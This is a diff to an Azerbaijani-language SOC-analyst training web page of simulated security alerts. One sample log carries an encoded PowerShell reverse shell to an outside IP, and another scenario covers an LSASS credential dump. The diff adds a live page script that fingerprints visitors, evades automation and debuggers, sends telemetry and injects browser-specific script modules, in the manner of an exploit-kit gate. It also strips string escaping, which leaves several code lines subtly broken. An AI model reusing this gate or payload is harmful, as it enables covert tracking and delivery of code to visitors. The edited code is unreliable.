@@ -759,7 +759,7 @@
                     <div class="lg:col-span-5 bg-slate-900 rounded-xl p-4 border border-slate-800 space-y-3">
                         <div class="flex items-center justify-between">
                             <span class="text-xs font-mono text-amber-400"><i class="fa-solid fa-terminal mr-1.5"></i>${current.commandTitle}</span>
-                            <button onclick="copyToClipboard(\`${current.command.replace(/`/g, '\\`')}\`, 'Əmr')" class="text-xs font-mono px-2.5 py-1 rounded bg-slate-800 hover:bg-cyberCyan hover:text-slate-950 text-slate-300 transition">
+                            <button onclick="copyToClipboard(\`${current.command.replace(/`/g, '\`')}\`, 'Əmr')" class="text-xs font-mono px-2.5 py-1 rounded bg-slate-800 hover:bg-cyberCyan hover:text-slate-950 text-slate-300 transition">
                                 <i class="fa-regular fa-copy"></i> Kopyala
                             </button>
                         </div>
@@ -790,16 +790,16 @@
                 severityColor: 'red',
                 sourceIp: '10.24.18.105',
                 destHost: 'FIN-WKS-042.corp.local',
-                user: 'CORP\\a.mammadov',
+                user: 'CORP\a.mammadov',
                 eventId: 'Sysmon Event ID 1 / WinEvent 4688',
                 timestamp: '2026-11-26 02:11:04 AZT',
                 mitre: 'T1059.001 - PowerShell',
                 rawLog: `EventID: 1 (Process Create)
 UtcTime: 2026-11-25 22:11:04.312
-Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1ACIALAA0ADQANAA0ACkA
-ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
-User: CORP\\a.mammadov
+ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+User: CORP\a.mammadov
 Hashes: SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08`,
                 decodedHint: 'Base64 Dekod: $client = New-Object System.Net.Sockets.TCPClient("185.220.101.45",4444) -> Reverse Shell!',
                 correctAction: 'contain',
@@ -860,16 +860,16 @@ Ticket Ref: CHG-2026-4410 (Approved Weekly Scan)`,
                 severityColor: 'red',
                 sourceIp: '10.10.1.10',
                 destHost: 'DC01.corp.local (Domain Controller)',
-                user: 'CORP\\helpdesk_temp',
+                user: 'CORP\helpdesk_temp',
                 eventId: 'Sysmon Event ID 10 (ProcessAccess)',
                 timestamp: '2026-11-26 02:17:49 AZT',
                 mitre: 'T1003.001 - LSASS Memory',
                 rawLog: `EventID: 10 (ProcessAccessed)
-TargetImage: C:\\Windows\\System32\\lsass.exe
-SourceImage: C:\\Users\\Public\\rundll32.exe
+TargetImage: C:\Windows\System32\lsass.exe
+SourceImage: C:\Users\Public\rundll32.exe
 GrantedAccess: 0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
-CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d4e4|C:\\Users\\Public\\comsvcs.dll+1829
-User: CORP\\helpdesk_temp on DC01.corp.local`,
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d4e4|C:\Users\Public\comsvcs.dll+1829
+User: CORP\helpdesk_temp on DC01.corp.local`,
                 decodedHint: 'comsvcs.dll MiniDump vasitəsilə Domain Controller-in LSASS yaddaşından NTLM hash-ləri çıxarılır!',
                 correctAction: 'escalate',
                 feedbackSuccess: 'Mükəmməl! Domain Controller (DC01) üzərində LSASS dump aşkarlanıb — bu bütün Active Directory domeninin ələ keçirilməsi (Golden Ticket / Domain Admin) riskidir. Tier-1 analitik dərhal Tier-2/IR komandasına Eskalasiya etməlidir ki, KRBTGT sıfırlansın və geniş miqyaslı IR başlasın!',
@@ -968,7 +968,7 @@ User: CORP\\helpdesk_temp on DC01.corp.local`,
                 <div class="space-y-2">
                     <div class="flex items-center justify-between">
                         <span class="text-xs font-mono text-slate-400 uppercase"><i class="fa-solid fa-file-code text-cyberCyan mr-1.5"></i>Xam SIEM / Sysmon Loq Məlumatı</span>
-                        <button onclick="copyToClipboard(\`${active.rawLog.replace(/`/g, '\\`')}\`, 'Loq')" class="text-xs font-mono text-slate-400 hover:text-cyberCyan transition">
+                        <button onclick="copyToClipboard(\`${active.rawLog.replace(/`/g, '\`')}\`, 'Loq')" class="text-xs font-mono text-slate-400 hover:text-cyberCyan transition">
                             <i class="fa-regular fa-copy"></i> Loqu Kopyala
                         </button>
                     </div>
@@ -1129,7 +1129,7 @@ User: CORP\\helpdesk_temp on DC01.corp.local`,
                 icon: 'fa-radar',
                 desc: 'Yüksək sürətli şəbəkə trafikində imza (Signature) və anomaliya əsaslı müdaxilələri real vaxtda aşkarlayan və bloklayan IDS/IPS mühərriki.',
                 queryLabel: 'Suricata Fast.log Kritik Alert Filtrləmə:',
-                query: 'grep "\\[Priority: 1\\]" /var/log/suricata/fast.log | awk \'{print $1, $2, $5, $11, $13}\''
+                query: 'grep "\[Priority: 1\]" /var/log/suricata/fast.log | awk '{print $1, $2, $5, $11, $13}''
             },
             {
                 name: 'Zeek (Bro) NSM',
@@ -1156,7 +1156,7 @@ User: CORP\\helpdesk_temp on DC01.corp.local`,
                 icon: 'fa-share-nodes',
                 desc: 'Təhdid indikatorlarının (IOC), zərərli proqram imzalarının və APT kampaniyası məlumatlarının toplanması və SIEM/Firewall-a avtomatik ötürülməsi.',
                 queryLabel: 'MISP PyMISP ilə Son 24 Saatın Zərərli IP-ləri:',
-                query: 'python3 -c "from pymisp import PyMISP; m=PyMISP(url, key); print(m.search(type_attribute=\'ip-dst\', last=\'24h\'))"'
+                query: 'python3 -c "from pymisp import PyMISP; m=PyMISP(url, key); print(m.search(type_attribute='ip-dst', last='24h'))"'
             },
             {
                 name: 'Volatility 3',
@@ -1200,7 +1200,7 @@ User: CORP\\helpdesk_temp on DC01.corp.local`,
                     <div class="bg-slate-950/90 border border-slate-800 rounded-xl p-3 space-y-2">
                         <div class="flex items-center justify-between gap-2">
                             <span class="text-[10px] font-mono text-amber-400 truncate">${tool.queryLabel}</span>
-                            <button onclick="copyToClipboard(\`${tool.query.replace(/`/g, '\\`')}\`, '${tool.name} sorğusu')" class="shrink-0 text-[11px] font-mono px-2 py-0.5 rounded bg-slate-800 hover:bg-cyberCyan hover:text-slate-950 text-slate-300 transition">
+                            <button onclick="copyToClipboard(\`${tool.query.replace(/`/g, '\`')}\`, '${tool.name} sorğusu')" class="shrink-0 text-[11px] font-mono px-2 py-0.5 rounded bg-slate-800 hover:bg-cyberCyan hover:text-slate-950 text-slate-300 transition">
                                 <i class="fa-regular fa-copy"></i>
                             </button>
                         </div>
@@ -1266,7 +1266,7 @@ User: CORP\\helpdesk_temp on DC01.corp.local`,
                     {
                         id: 'T1547.001',
                         name: 'Registry Run Keys',
-                        desc: 'HKCU\\...\\CurrentVersion\\Run açarlarına zərərli proqram yolunun əlavə edilməsi.',
+                        desc: 'HKCU\...\CurrentVersion\Run açarlarına zərərli proqram yolunun əlavə edilməsi.',
                         telemetry: ['Sysmon Event ID 12, 13, 14 (Registry Events)', 'EDR Behavioral Alerts'],
                         mitigation: ['Registry açarlarına yazma icazələrinin sərtləşdirilməsi']
                     }
@@ -1529,257 +1529,261 @@ User: CORP\\helpdesk_temp on DC01.corp.local`,
             renderRoadmap();
         };
     </script>
-(function (window, document) {
-    'use strict';
 
-    const LAB_CONFIG = {
-        modules: {
-            modern: '/modules/modern_check.js',
-            legacy: '/modules/legacy_check.js',
-            generic: '/modules/generic_check.js'
-        },
-        shifting: {
-            blockWebdriver: true,
-            weights: {
-                modern: 0.4,
-                legacy: 0.3,
-                generic: 0.3
-            }
-        },
-        telemetry: {
-            endpoint: '/api/telemetry',
-            batchSize: 5,
-            logToConsole: true
-        },
-        antiDebug: true,
-        delayLoad: 200
-    };
+    <script>
+    (function (window, document) {
+        'use strict';
 
-    const Fingerprinter = {
-        getUA: function () {
-            return navigator.userAgent || '';
-        },
-        getBrowser: function () {
-            const ua = this.getUA().toLowerCase();
-            if (/edg/.test(ua)) return 'edge';
-            if (/chrome|crios/.test(ua)) return 'chrome';
-            if (/firefox|fxios/.test(ua)) return 'firefox';
-            if (/safari/.test(ua) && /version/.test(ua)) return 'safari';
-            if (/msie|trident/.test(ua)) return 'ie';
-            return 'unknown';
-        },
-        getOS: function () {
-            const ua = this.getUA().toLowerCase();
-            if (/win/.test(ua)) return 'windows';
-            if (/mac/.test(ua)) return 'macos';
-            if (/android/.test(ua)) return 'android';
-            if (/iphone|ipad|ipod/.test(ua)) return 'ios';
-            if (/linux/.test(ua)) return 'linux';
-            return 'unknown';
-        },
-        getScreen: function () {
-            return {
-                width: window.screen.width,
-                height: window.screen.height,
-                depth: window.screen.colorDepth
-            };
-        },
-        getPlugins: function () {
-            return navigator.plugins ? Array.from(navigator.plugins).map(function (p) {
-                return p.name;
-            }) : [];
-        },
-        getLanguage: function () {
-            return navigator.language || 'unknown';
-        },
-        getTimezone: function () {
-            try {
-                return Intl.DateTimeFormat().resolvedOptions().timeZone;
-            } catch (e) {
+        const LAB_CONFIG = {
+            modules: {
+                modern: '/modules/modern_check.js',
+                legacy: '/modules/legacy_check.js',
+                generic: '/modules/generic_check.js'
+            },
+            shifting: {
+                blockWebdriver: true,
+                weights: {
+                    modern: 0.4,
+                    legacy: 0.3,
+                    generic: 0.3
+                }
+            },
+            telemetry: {
+                endpoint: '/api/telemetry',
+                batchSize: 5,
+                logToConsole: true
+            },
+            antiDebug: true,
+            delayLoad: 200
+        };
+
+        const Fingerprinter = {
+            getUA: function () {
+                return navigator.userAgent || '';
+            },
+            getBrowser: function () {
+                const ua = this.getUA().toLowerCase();
+                if (/edg/.test(ua)) return 'edge';
+                if (/chrome|crios/.test(ua)) return 'chrome';
+                if (/firefox|fxios/.test(ua)) return 'firefox';
+                if (/safari/.test(ua) && /version/.test(ua)) return 'safari';
+                if (/msie|trident/.test(ua)) return 'ie';
                 return 'unknown';
-            }
-        },
-        getCanvasFingerprint: function () {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                if (!ctx) return 'unsupported';
-                ctx.textBaseline = 'top';
-                ctx.font = '14px "Arial"';
-                ctx.fillText('Lab-Telemetry-Check', 2, 2);
-                return canvas.toDataURL();
-            } catch (e) {
-                return 'blocked';
-            }
-        }
-    };
-
-    const Shifter = {
-        determineTarget: function (fingerprint) {
-            const browser = fingerprint.browser;
-            const rand = Math.random();
-            let cumulative = 0;
-
-            const weights = LAB_CONFIG.shifting.weights;
-            const activeWeights = {};
-
-            for (const key of Object.keys(weights)) {
-                const weight = weights[key];
-                if (key === 'modern' && (browser === 'chrome' || browser === 'firefox' || browser === 'edge')) {
-                    activeWeights[key] = weight;
-                }
-                if (key === 'legacy' && (browser === 'ie' || browser === 'edge')) {
-                    activeWeights[key] = weight;
-                }
-                if (key === 'generic') {
-                    activeWeights[key] = weight;
-                }
-            }
-
-            const totalWeight = Object.values(activeWeights).reduce(function (a, b) {
-                return a + b;
-            }, 0);
-
-            for (const key of Object.keys(activeWeights)) {
-                cumulative += activeWeights[key] / totalWeight;
-                if (rand <= cumulative) {
-                    return LAB_CONFIG.modules[key] || LAB_CONFIG.modules.generic;
-                }
-            }
-
-            return LAB_CONFIG.modules.generic;
-        },
-
-        isBlocked: function () {
-            return Boolean(LAB_CONFIG.shifting.blockWebdriver && navigator.webdriver);
-        }
-    };
-
-    const Telemetry = {
-        queue: [],
-        collect: function (data) {
-            const entry = {
-                timestamp: new Date().toISOString(),
-                data: data,
-                url: window.location.href
-            };
-            this.queue.push(entry);
-
-            if (LAB_CONFIG.telemetry.logToConsole) {
-                console.log('[LAB TELEMETRY]', entry);
-            }
-
-            if (this.queue.length >= LAB_CONFIG.telemetry.batchSize) {
-                this.send();
-            }
-        },
-        send: function () {
-            if (this.queue.length === 0) return;
-            const payload = JSON.stringify(this.queue);
-            this.queue = [];
-
-            if (!LAB_CONFIG.telemetry.endpoint) return;
-
-            fetch(LAB_CONFIG.telemetry.endpoint, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: payload
-            }).catch(function (err) {
-                console.warn('[LAB TELEMETRY] Endpoint sorğusu xətası:', err.message);
-            });
-        }
-    };
-
-    const Engine = {
-        run: function () {
-            const self = this;
-            setTimeout(function () {
-                const fingerprint = {
-                    ua: Fingerprinter.getUA(),
-                    browser: Fingerprinter.getBrowser(),
-                    os: Fingerprinter.getOS(),
-                    screen: Fingerprinter.getScreen(),
-                    plugins: Fingerprinter.getPlugins(),
-                    language: Fingerprinter.getLanguage(),
-                    timezone: Fingerprinter.getTimezone(),
-                    canvas: Fingerprinter.getCanvasFingerprint()
+            },
+            getOS: function () {
+                const ua = this.getUA().toLowerCase();
+                if (/win/.test(ua)) return 'windows';
+                if (/mac/.test(ua)) return 'macos';
+                if (/android/.test(ua)) return 'android';
+                if (/iphone|ipad|ipod/.test(ua)) return 'ios';
+                if (/linux/.test(ua)) return 'linux';
+                return 'unknown';
+            },
+            getScreen: function () {
+                return {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    depth: window.screen.colorDepth
                 };
+            },
+            getPlugins: function () {
+                return navigator.plugins ? Array.from(navigator.plugins).map(function (p) {
+                    return p.name;
+                }) : [];
+            },
+            getLanguage: function () {
+                return navigator.language || 'unknown';
+            },
+            getTimezone: function () {
+                try {
+                    return Intl.DateTimeFormat().resolvedOptions().timeZone;
+                } catch (e) {
+                    return 'unknown';
+                }
+            },
+            getCanvasFingerprint: function () {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    if (!ctx) return 'unsupported';
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px "Arial"';
+                    ctx.fillText('Lab-Telemetry-Check', 2, 2);
+                    return canvas.toDataURL();
+                } catch (e) {
+                    return 'blocked';
+                }
+            }
+        };
 
-                let debuggerDetected = false;
-                if (LAB_CONFIG.antiDebug) {
-                    const start = performance.now();
-                    debugger;
-                    const end = performance.now();
-                    if (end - start > 100) {
-                        debuggerDetected = true;
-                        console.log('[LAB] Debugger fasiləsi aşkarlandı.');
+        const Shifter = {
+            determineTarget: function (fingerprint) {
+                const browser = fingerprint.browser;
+                const rand = Math.random();
+                let cumulative = 0;
+
+                const weights = LAB_CONFIG.shifting.weights;
+                const activeWeights = {};
+
+                for (const key of Object.keys(weights)) {
+                    const weight = weights[key];
+                    if (key === 'modern' && (browser === 'chrome' || browser === 'firefox' || browser === 'edge')) {
+                        activeWeights[key] = weight;
+                    }
+                    if (key === 'legacy' && (browser === 'ie' || browser === 'edge')) {
+                        activeWeights[key] = weight;
+                    }
+                    if (key === 'generic') {
+                        activeWeights[key] = weight;
                     }
                 }
 
-                if (Shifter.isBlocked()) {
+                const totalWeight = Object.values(activeWeights).reduce(function (a, b) {
+                    return a + b;
+                }, 0);
+
+                for (const key of Object.keys(activeWeights)) {
+                    cumulative += activeWeights[key] / totalWeight;
+                    if (rand <= cumulative) {
+                        return LAB_CONFIG.modules[key] || LAB_CONFIG.modules.generic;
+                    }
+                }
+
+                return LAB_CONFIG.modules.generic;
+            },
+
+            isBlocked: function () {
+                return Boolean(LAB_CONFIG.shifting.blockWebdriver && navigator.webdriver);
+            }
+        };
+
+        const Telemetry = {
+            queue: [],
+            collect: function (data) {
+                const entry = {
+                    timestamp: new Date().toISOString(),
+                    data: data,
+                    url: window.location.href
+                };
+                this.queue.push(entry);
+
+                if (LAB_CONFIG.telemetry.logToConsole) {
+                    console.log('[LAB TELEMETRY]', entry);
+                }
+
+                if (this.queue.length >= LAB_CONFIG.telemetry.batchSize) {
+                    this.send();
+                }
+            },
+            send: function () {
+                if (this.queue.length === 0) return;
+                const payload = JSON.stringify(this.queue);
+                this.queue = [];
+
+                if (!LAB_CONFIG.telemetry.endpoint) return;
+
+                fetch(LAB_CONFIG.telemetry.endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: payload
+                }).catch(function (err) {
+                    console.warn('[LAB TELEMETRY] Endpoint sorğusu xətası:', err.message);
+                });
+            }
+        };
+
+        const Engine = {
+            run: function () {
+                const self = this;
+                setTimeout(function () {
+                    const fingerprint = {
+                        ua: Fingerprinter.getUA(),
+                        browser: Fingerprinter.getBrowser(),
+                        os: Fingerprinter.getOS(),
+                        screen: Fingerprinter.getScreen(),
+                        plugins: Fingerprinter.getPlugins(),
+                        language: Fingerprinter.getLanguage(),
+                        timezone: Fingerprinter.getTimezone(),
+                        canvas: Fingerprinter.getCanvasFingerprint()
+                    };
+
+                    let debuggerDetected = false;
+                    if (LAB_CONFIG.antiDebug) {
+                        const start = performance.now();
+                        debugger;
+                        const end = performance.now();
+                        if (end - start > 100) {
+                            debuggerDetected = true;
+                            console.log('[LAB] Debugger fasiləsi aşkarlandı.');
+                        }
+                    }
+
+                    if (Shifter.isBlocked()) {
+                        Telemetry.collect({
+                            ...fingerprint,
+                            debuggerDetected: debuggerDetected,
+                            status: 'blocked'
+                        });
+                        return;
+                    }
+
+                    const targetModule = Shifter.determineTarget(fingerprint);
+
                     Telemetry.collect({
                         ...fingerprint,
                         debuggerDetected: debuggerDetected,
-                        status: 'blocked'
+                        status: 'selected',
+                        module: targetModule
                     });
+
+                    self.injectModule(targetModule);
+                }, LAB_CONFIG.delayLoad);
+            },
+
+            init: function () {
+                const self = this;
+                if (document.readyState === 'loading') {
+                    document.addEventListener('DOMContentLoaded', function () {
+                        self.run();
+                    });
+                } else {
+                    self.run();
+                }
+            },
+
+            injectModule: function (url) {
+                if (!document.body) {
+                    console.warn('[LAB] document.body hələ hazır deyil.');
                     return;
                 }
-
-                const targetModule = Shifter.determineTarget(fingerprint);
-
-                Telemetry.collect({
-                    ...fingerprint,
-                    debuggerDetected: debuggerDetected,
-                    status: 'selected',
-                    module: targetModule
-                });
-
-                self.injectModule(targetModule);
-            }, LAB_CONFIG.delayLoad);
-        },
-
-        init: function () {
-            const self = this;
-            if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', function () {
-                    self.run();
-                });
-            } else {
-                self.run();
+                const script = document.createElement('script');
+                script.src = url;
+                script.async = true;
+                script.defer = true;
+                script.onerror = function () {
+                    console.warn('[LAB] Modul yüklənmədi (test faylı yoxdur):', url);
+                };
+                document.body.appendChild(script);
             }
-        },
+        };
 
-        injectModule: function (url) {
-            if (!document.body) {
-                console.warn('[LAB] document.body hələ hazır deyil.');
-                return;
+        const Stealth = {
+            checkIntegrity: function () {
+                if (window.__LAB_ENGINE_LOADED__) {
+                    console.warn('[LAB] Skript artıq işə düşüb, təkrar icra dayandırıldı.');
+                    return false;
+                }
+                window.__LAB_ENGINE_LOADED__ = true;
+                return true;
             }
-            const script = document.createElement('script');
-            script.src = url;
-            script.async = true;
-            script.defer = true;
-            script.onerror = function () {
-                console.warn('[LAB] Modul yüklənmədi (test faylı yoxdur):', url);
-            };
-            document.body.appendChild(script);
+        };
+
+        if (Stealth.checkIntegrity()) {
+            Engine.init();
         }
-    };
 
-    const Stealth = {
-        checkIntegrity: function () {
-            if (window.__LAB_ENGINE_LOADED__) {
-                console.warn('[LAB] Skript artıq işə düşüb, təkrar icra dayandırıldı.');
-                return false;
-            }
-            window.__LAB_ENGINE_LOADED__ = true;
-            return true;
-        }
-    };
+    })(window, document);
+    </script>
 
-    if (Stealth.checkIntegrity()) {
-        Engine.init();
-    }
-
-})(window, document);
 </body>
 </html>
